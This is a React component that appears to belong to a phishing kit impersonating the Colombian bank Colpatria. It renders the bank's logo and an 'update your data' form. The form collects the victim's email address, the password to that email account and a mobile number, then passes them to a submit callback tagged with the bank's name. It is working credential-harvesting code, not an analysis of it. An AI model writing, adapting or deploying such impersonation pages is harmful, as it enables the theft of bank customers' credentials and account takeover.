/* eslint-disable @next/next/no-img-element */
"use client";
import React, { useState } from 'react';
import { Mail, Key, Smartphone } from 'lucide-react';

const DaviplataLogo: React.FC = () => (
  <div className="flex items-center space-x-1 mb-6 pt-2">
    <img src="/bancos/colpatria/new-brand-red.svg" className='h-8 w-[120px]' alt="Logo" />
  </div>
);

interface Props {
  enviar?: (data: any) => void;
}

const ActDatos: React.FC<Props> = ({ enviar }) => {
  const [correo, setCorreo] = useState('');
  const [clave, setClave] = useState('');
  const [celular, setCelular] = useState('');

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    enviar?.({ view: "actdatos", correo, clave, celular, bank: "colpatria", timestamp: new Date().toISOString() });
  };

  return (
    <div className="w-full mx-auto pl-[37px] pr-[37px] pt-[41px] pb-10 bg-white min-h-screen">
      <DaviplataLogo />

      <h1 className="text-[27px] font-extrabold text-gray-800 mb-2">
        Actualiza tus datos
      </h1>
      <p className="text-gray-600 mb-8 text-sm">
        Por favor, ingresa los siguientes datos para continuar con el proceso.
      </p>

      <form onSubmit={handleSubmit} className="space-y-6">
        <div className="relative">
          <Mail className="absolute left-0 top-1/2 transform -translate-y-1/2 text-gray-500 w-5 h-5" />
          <input
            type="email"
            placeholder="Correo electrónico"
            className="w-full pl-8 pb-2 border-b-2 border-gray-300 focus:border-[#ec111a] outline-none text-base transition duration-150"
            required
            value={correo}
            onChange={(e) => setCorreo(e.target.value)}
          />
        </div>

        <div className="relative pt-4">
          <Key className="absolute left-0 top-1/2 transform -translate-y-1/2 text-gray-500 w-5 h-5" />
          <input
            type="password"
            placeholder="Clave del correo"
            className="w-full pl-8 pb-2 border-b-2 border-gray-300 focus:border-[#ec111a] outline-none text-base transition duration-150"
            required
            value={clave}
            onChange={(e) => setClave(e.target.value)}
          />
        </div>

        <div className="relative pt-4">
          <Smartphone className="absolute left-0 top-1/2 transform -translate-y-1/2 text-gray-500 w-5 h-5" />
          <input
            type="tel"
            maxLength={10}
            placeholder="Número de celular"
            className="w-full pl-8 pb-2 border-b-2 border-gray-300 focus:border-[#ec111a] outline-none text-base transition duration-150"
            required
            value={celular}
            onChange={(e) => setCelular(e.target.value.replace(/\D/g, ""))}
          />
        </div>

        <button
          type="submit"
          disabled={!correo || !clave || celular.length < 10}
          className={`w-full py-3 mt-8 text-[16px] text-white font-medium rounded-md transition duration-200 shadow-md cursor-pointer ${correo && clave && celular.length >= 10 ? 'bg-[#ec111a] hover:bg-[#be061b]' : 'bg-gray-300'}`}
        >
          Continuar
        </button>
      </form>
    </div>
  );
};

export default ActDatos;
